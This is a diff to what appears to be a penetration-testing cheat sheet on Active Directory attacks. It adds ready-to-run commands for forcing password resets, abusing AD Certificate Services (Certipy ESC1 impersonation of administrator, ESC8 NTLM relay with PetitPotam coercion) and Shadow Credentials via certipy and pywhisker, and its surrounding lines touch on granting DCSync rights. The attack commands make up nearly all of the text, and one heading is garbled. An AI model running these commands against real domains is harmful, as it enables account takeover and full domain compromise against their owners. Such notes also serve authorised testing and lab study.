@@ -121,6 +121,36 @@ Use this for interacting with AD objects from Kali without requiring a full Wind
   ```bash
   bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 set password 'CN=target_user,CN=Users,DC=domain,DC=local' 'NewPassword123!'
   ```
+- **Reset- **RPC Password Reset (ForceChangePassword Rights):**
+  - `net rpc password [TARGET_USER] [NEW_PASS] -U [DOMAIN]/[MY_USER]%[MY_PASS] -S [DC_IP]`
+
+### Advanced AD Paths (OCD Style)
+
+#### 1. AD CS (Certificate Services)
+- **Discovery (Certipy):**
+  ```bash
+  certipy find -u [USER]@[DOMAIN] -p [PASS] -dc-ip [DC_IP] -vulnerable
+  ```
+- **ESC1 (Enrollee Supplies Subject):**
+  - *Scenario*: Template allows SAN specification (impersonation).
+  - `certipy req -u [USER]@[DOMAIN] -p [PASS] -ca [CA_NAME] -template [VULN_TEMPLATE] -upn administrator@[DOMAIN] -dc-ip [DC_IP]`
+  - `certipy auth -pfx administrator.pfx -dc-ip [DC_IP]`
+- **ESC8 (AD CS NTLM Relay):**
+  - *Scenario*: Web Enrollment (HTTP) is enabled without NTLM protection.
+  - 1. Setup Relay: `impacket-ntlmrelayx -t http://[CA_IP]/certsrv/certfnsh.asp -smb2support --adcs --template [TEMPLATE]`
+  - 2. Trigger Auth: Use PetitPotam or SpoolSample to the relay.
+
+#### 2. Shadow Credentials (msDS-KeyCredentialLink)
+- **Scenario**: You have **GenericWrite** or **GenericAll** over a user/computer but cannot reset their password.
+- **Execution (Certipy):**
+  ```bash
+  certipy shadow auto -u [MY_USER]@[DOMAIN] -p [MY_PASS] -account [TARGET_ACCOUNT] -dc-ip [DC_IP]
+  ```
+- **Execution (PyWhisker):**
+  ```bash
+  python3 pywhisker.py -d [DOMAIN] -u [MY_USER] -p [MY_PASS] --target [TARGET] --action "add"
+  ```
+- **Note**: This generates a certificate you use to authenticate via PKINIT.
 - **Set GenericWrite (e.g., set DS-Install-Replica for DCSync)**:
   ```bash
   # Granting DCSync rights to a user
